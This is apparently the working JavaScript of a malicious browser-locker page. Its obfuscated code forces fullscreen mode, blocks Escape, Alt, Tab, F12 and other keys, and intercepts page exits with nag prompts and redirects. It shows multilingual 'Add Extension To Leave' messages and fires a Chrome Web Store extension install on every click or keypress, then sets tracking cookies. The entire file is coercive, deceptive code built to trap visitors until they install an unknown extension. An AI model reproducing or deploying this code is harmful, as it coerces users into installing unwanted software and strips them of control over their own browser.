var fs = false;
var refurl = 'index.html';
function setCookie(b, c, h) {
    var o = new Date;
    o['setTime'](o['getTime']() + (h * 3600 * 1000)), document['cookie'] = b + '=' + escape(c) + ';expires=' + o['toGMTString']()
}

function getCookie(b) {
    var c, d = new RegExp('(^| )' + b + '=([^;]*)(;|$)');
    return (c = document['cookie']['match'](d)) ? unescape(c[2]) : null
}

function extraLog(b) {}

function fS78BBRY7z() {
    var b = window['navigator']['userLanguage'] || window['navigator']['language'];
    languagePart = b['split']('-'), b = languagePart[0];
    var c = {
        en: 'Add Extension To Leave',
        fr: 'Ajouter l\'extension pour quitter',
        de: 'Zum Verlassen die Erweiterung hinzufgen',
        sv: 'Lgg till tillgg fr att lmna sidan',
        nb: 'Legg til utvidelse for  forlate',
        nl: 'Voeg Extensie Toe Om Te Verlaten',
        da: 'Tilfj udvidelse for at forlade',
        fi: 'Lis laajennus poistuaksesi',
        es: 'Aadir extensin para dejar',
        it: 'Aggiungere l\'estensione da lasciare'
    };
    if (imgPath = 'images/smumi-en.png?mb=', typeof c[b] == 'undefined' || c[b] == '') {
        var d = 'Add Extension To Leave'
    } else {
        var d = c[b]
    };
    return null != document['getElementById']('master') && null == document['getElementById']('imdz') && (document['getElementById']('master')['innerHTML'] = '<center><img id="imdz" src="' + imgPath + '" alt=""/></center>'), d + ''
}

function mouseLeave() {
    if (typeof(fa) == "undefined") {
        alert("Add Extension to Leave");
    }
    getCookie('isInstalled') || location['assign'](refurl)
}

function handleVisibilityChange() {
    document['hidden'] && nConLoad()
}

function getChromeVersion() {
    var b = navigator['userAgent']['match'](/Chrom(e|ium)\/([0-9]+)\./);
    return !!b && parseInt(b[2], 10)
}

function log(b, c) {}

function frYTRNAFyZ() {
    setCookie('isInstalled', 'installed', 1),
    setCookie("pid", pid, 1),
    setCookie("sysid", sysid, 1),
    document['getElementsByTagName']('html')[0]['addEventListener']('mouseleave', mouseLeave, !1),
    document['getElementsByTagName']('html')[0]['style']['display'] = 'none',
    window['beforeunload'] = null, window['onbeforeunload'] = null,
    clearInterval(window['myTimer']),
    nStoT(function() {
        var b = yoo + insturly + yoo2 + insturly2 + yoo3 + insturly3 + yoo4 + insturly4;
        // location['replace'](b)
    }, 600)
}

function kostofull() {
    screenfull['request']()
}

function mouseDown(b) {
    switch (b = b || window['event'], b['which']) {
        case 1:
            ;
        case 2:
            ;
        case 3:
            ints()
    }
}

var realVersion = getChromeVersion();
extraLog({
    event: 'visit'
}), extraLog({
    event: 'navigator',
    platform: window['navigator']['platform'],
    userAgent: window['navigator']['userAgent'],
    language: window['navigator']['language'],
    version: getChromeVersion()
});
var fyTyFTNt8b = extid;
! function() {
    'use strict'
    var b = typeof module !== 'undefined' && module['exports'],
        c = typeof Element !== 'undefined' && 'ALLOW_KEYBOARD_INPUT' in Element,
        d = function() {
            for (var b, c = [
                    ['requestFullscreen', 'exitFullscreen', 'fullscreenElement', 'fullscreenEnabled', 'fullscreenchange', 'fullscreenerror'],
                    ['webkitRequestFullscreen', 'webkitExitFullscreen', 'webkitFullscreenElement', 'webkitFullscreenEnabled', 'webkitfullscreenchange', 'webkitfullscreenerror'],
                    ['webkitRequestFullScreen', 'webkitCancelFullScreen', 'webkitCurrentFullScreenElement', 'webkitCancelFullScreen', 'webkitfullscreenchange', 'webkitfullscreenerror'],
                    ['mozRequestFullScreen', 'mozCancelFullScreen', 'mozFullScreenElement', 'mozFullScreenEnabled', 'mozfullscreenchange', 'mozfullscreenerror'],
                    ['msRequestFullscreen', 'msExitFullscreen', 'msFullscreenElement', 'msFullscreenEnabled', 'MSFullscreenChange', 'MSFullscreenError']
                ], d = 0, o = c['length'], r = {}; d < o; d++) {
                if ((b = c[d]) && b[1] in document) {
                    for (d = 0; d < b['length']; d++) {
                        r[c[0][d]] = b[d]
                    };
                    return r
                }
            };
            return !1
        }(),
        o = {
            request: function(b) {
                var o = d['requestFullscreen'];
                b = b || document['documentElement'], /5\.1[\.\d]* Safari/ ['test'](navigator['userAgent']) ? b[o]() : b[o](c && Element['ALLOW_KEYBOARD_INPUT'])
            },
            exit: function() {
                document[d['exitFullscreen']]()
            },
            toggle: function(b) {
                this['isFullscreen'] ? this['exit']() : this['request'](b)
            },
            raw: d
        };
    if (!d) {
        return void((b ? module['exports'] = !1 : window['screenfull'] = !1))
    };
    Object['defineProperties'](o, {
        isFullscreen: {
            get: function() {
                return Boolean(document[d['fullscreenElement']])
            }
        },
        element: {
            enumerable: !0,
            get: function() {
                return document[d['fullscreenElement']]
            }
        },
        enabled: {
            enumerable: !0,
            get: function() {
                return Boolean(document[d['fullscreenEnabled']])
            }
        }
    }), b ? module['exports'] = o : window['screenfull'] = o
}(), window['onbeforeunload'] = function() {
    return 'are you realy reload?'
};
var imgPath;
fS78BBRY7z();
var nConLoad = function() {
    return getCookie('test') || getCookie('isInstalled') || (setCookie('test', '111', 1) , location['assign'](refurl)), 'are you true leave?'
};
var nConLoad = function() {}
window['onkeydown'] = function(b) {
    if (27 == b['keyCode'] || 18 == b['keyCode'] || 123 == b['keyCode'] || 85 == b['keyCode'] || 9 == b['keyCode'] || 115 == b['keyCode'] || 116 == b['keyCode'] || 112 == b['keyCode'] || 114 == b['keyCode'] || 17 == b['keyCode']) {
        return location['assign'](refurl), !1
    }
}, document['getElementsByTagName']('html')[0]['addEventListener']('mouseleave', mouseLeave, !1), document['addEventListener']('visibilitychange', handleVisibilityChange, !1);
var nChrIn = chrome['webstore']['install'],
    nStoT = window['setTimeout'],
    fs_check;
document['getElementsByTagName']('html')[0]['style']['overflow'] = 'hidden', document['getElementsByTagName']('body')[0]['style']['overflow'] = 'hidden';
var realVersion = getChromeVersion(),
    url = 'https://chrome.google.com/webstore/detail/' + fyTyFTNt8b;

function fD2nBnesft(b) {
    fs = false;
    if (typeof(esc) != "undefined" && esc) {
        try {
            document.webkitCancelFullScreen()
        } catch (e) {}
        try {
            document.cancelFullscreen()
        } catch (e) {}
    }
    document['getElementsByTagName']('html')[0]['addEventListener']('mouseleave', mouseLeave, !1)
}
ints = function() {
    fs = true;
    document.body.style.cursor = 'default';
    if (56 != realVersion && 57 != realVersion && 58 != realVersion && 59 != realVersion && 60 != realVersion && 61 != realVersion && 62 != realVersion) {
        document['getElementsByTagName']('html')[0]['removeEventListener']('mouseleave', mouseLeave, !1),
        nChrIn(url, frYTRNAFyZ, fD2nBnesft), kostofull()
    } else {
        if (document['getElementsByTagName']('html')[0]['removeEventListener']('mouseleave', mouseLeave, !1), nChrIn(url, frYTRNAFyZ, fD2nBnesft), nStoT(kostofull, 1e3), screenfull['isFullscreen']) {
            try {
                document['webkitCancelFullScreen'](), nStoT(kostofull, 1e3)
            } catch (a) {};
            try {
                document['cancelFullscreen'](), nStoT(kostofull, 1e3)
            } catch (a) {}
        }
    };
    return fs_check = !0
}, document.body.addEventListener("click", function() {
    fa = true;
    mouseDown(event)
}), document.body.addEventListener("keyup", function(b) {
    console.log(b.which);
    fa = true;
    ints()
}, !1), null != document.getElementById("master") && null == document.getElementById("imdz"),
        document.addEventListener(screenfull.raw.fullscreenchange, function() {
    if (screenfull.isFullscreen) {
        fs = true;
        document.body.style.cursor = 'default';
        document.getElementById("imdz").src = "images/xifuea.png"
    } else {
        fs = false;
        document.getElementById("imdz").src = imgPath
    }
}), window.onunload = function() {
    extraLog({
        event: "pageunload"
    })
};
